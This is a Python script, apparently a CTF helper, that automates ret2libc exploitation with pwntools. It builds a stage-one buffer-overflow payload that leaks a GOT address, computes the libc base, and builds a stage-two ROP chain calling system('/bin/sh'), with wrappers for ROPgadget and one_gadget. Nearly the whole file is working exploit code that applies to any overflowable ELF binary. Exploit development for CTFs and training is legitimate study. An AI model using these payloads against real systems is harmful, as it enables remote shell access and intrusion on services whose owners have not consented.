#!/usr/bin/env python3
"""
rop_chain_auto.py -- Automates the "leak one GOT/PLT address, resolve libc,
build ret2libc chain" pattern that shows up in most PWN ret2libc challenges,
plus a gadget search helper for hand-built chains (SROP, one-gadget hunting).

Requires: pip install pwntools

Usage examples:
    # Full auto: leak puts@GOT via a puts(GOT[puts]) call, resolve libc from
    # a local libc db (needs libc.so.6 on disk, or --libc-db for libc-database
    # style offset lookup), then pivot into a system("/bin/sh") ret2libc chain.
    python3 rop_chain_auto.py --binary ./chall --offset 40 --auto-ret2libc \
        --libc ./libc.so.6

    # Just print candidate gadgets for a manual chain (pop rdi; ret, etc.)
    python3 rop_chain_auto.py --binary ./chall --find-gadgets "pop rdi"

    # One-gadget candidates for a leaked libc base (wraps the `one_gadget` CLI
    # tool if installed -- pip/gem install one_gadget separately)
    python3 rop_chain_auto.py --libc ./libc.so.6 --one-gadget
"""
import argparse
import subprocess


def build_ret2libc_stage1(elf_path, offset, leak_func="puts"):
    """
    Build the first-stage payload: overflow to `offset`, then ROP a call to
    leak_func(GOT[leak_func]) and return to main (or _start) so we can send
    a second payload once libc base is known.

    Returns (payload_bytes, elf) -- caller sends payload_bytes, receives the
    leaked address, computes libc.address = leak - libc.symbols[leak_func],
    then calls build_ret2libc_stage2().
    """
    from pwn import ELF, ROP, p64

    elf = ELF(elf_path)
    rop = ROP(elf)
    rop.call(leak_func, [elf.got[leak_func]])
    # Return to main (or _start) to get a second shot at the input
    return_target = elf.symbols.get("main") or elf.entry
    rop.call(return_target)
    payload = b"A" * offset + rop.chain()
    return payload, elf


def build_ret2libc_stage2(elf, libc, leaked_addr, offset, leak_func="puts", target_func="system", arg=b"/bin/sh\x00"):
    """
    Given a resolved libc base, build the second-stage payload that calls
    target_func(arg) -- classic ret2libc finishing move.
    """
    from pwn import ROP

    libc.address = leaked_addr - libc.symbols[leak_func]
    rop2 = ROP(libc)
    arg_addr = next(libc.search(arg))
    rop2.call(target_func, [arg_addr])
    payload = b"A" * offset + rop2.chain()
    return payload, libc.address


def find_gadgets(binary_path, pattern):
    """
    Wrapper around ROPgadget (must be installed: pip install ROPgadget or
    apt install ropgadget) to search for a specific gadget pattern, e.g.
    "pop rdi", "pop rsi; pop r15", "syscall".
    """
    try:
        result = subprocess.run(
            ["ROPgadget", "--binary", binary_path, "--only", "pop|ret"],
            capture_output=True, text=True, timeout=60,
        )
        lines = [l for l in result.stdout.splitlines() if pattern.split()[0] in l.lower()]
        if not lines:
            # fall back to unfiltered search if the --only filter was too narrow
            result = subprocess.run(
                ["ROPgadget", "--binary", binary_path],
                capture_output=True, text=True, timeout=120,
            )
            lines = [l for l in result.stdout.splitlines() if pattern.lower() in l.lower()]
        return lines
    except FileNotFoundError:
        print("[-] ROPgadget not found. Install with: pip install ROPgadget")
        return []


def one_gadget_search(libc_path):
    """Wrapper around the `one_gadget` tool (Ruby gem: gem install one_gadget)."""
    try:
        result = subprocess.run(["one_gadget", libc_path], capture_output=True, text=True, timeout=60)
        return result.stdout
    except FileNotFoundError:
        print("[-] one_gadget not found. Install with: gem install one_gadget")
        return ""


def main():
    ap = argparse.ArgumentParser(description="ROP/ret2libc chain automation for CTF PWN challenges")
    ap.add_argument("--binary", help="path to target ELF")
    ap.add_argument("--libc", help="path to matching libc.so.6")
    ap.add_argument("--offset", type=int, help="buffer overflow offset to saved return address")
    ap.add_argument("--leak-func", default="puts", help="function to leak a GOT address with (default: puts)")
    ap.add_argument("--target-func", default="system", help="final function to call (default: system)")
    ap.add_argument("--auto-ret2libc", action="store_true",
                     help="print stage-1 payload; you drive the socket I/O yourself and call "
                          "build_ret2libc_stage2() once the leak comes back (see module docstring)")
    ap.add_argument("--find-gadgets", metavar="PATTERN", help='e.g. "pop rdi", "syscall"')
    ap.add_argument("--one-gadget", action="store_true")
    args = ap.parse_args()

    if args.find_gadgets:
        if not args.binary:
            print("[-] --binary required for --find-gadgets")
            return
        for line in find_gadgets(args.binary, args.find_gadgets):
            print(line)
        return

    if args.one_gadget:
        if not args.libc:
            print("[-] --libc required for --one-gadget")
            return
        print(one_gadget_search(args.libc))
        return

    if args.auto_ret2libc:
        if not (args.binary and args.offset is not None):
            print("[-] --binary and --offset required for --auto-ret2libc")
            return
        payload, elf = build_ret2libc_stage1(args.binary, args.offset, args.leak_func)
        print(f"[+] Stage-1 payload ({len(payload)} bytes) -- send this, then read the leaked "
              f"{args.leak_func} address from the response:")
        print(payload)
        print("\n[*] Next: in your own pwntools script, do:")
        print(f"    libc = ELF({args.libc!r})")
        print(f"    payload2, libc_base = build_ret2libc_stage2(elf, libc, leaked_addr, {args.offset}, "
              f"{args.leak_func!r}, {args.target_func!r})")
        print("    io.sendline(payload2); io.interactive()")
        return

    ap.print_help()


if __name__ == "__main__":
    main()
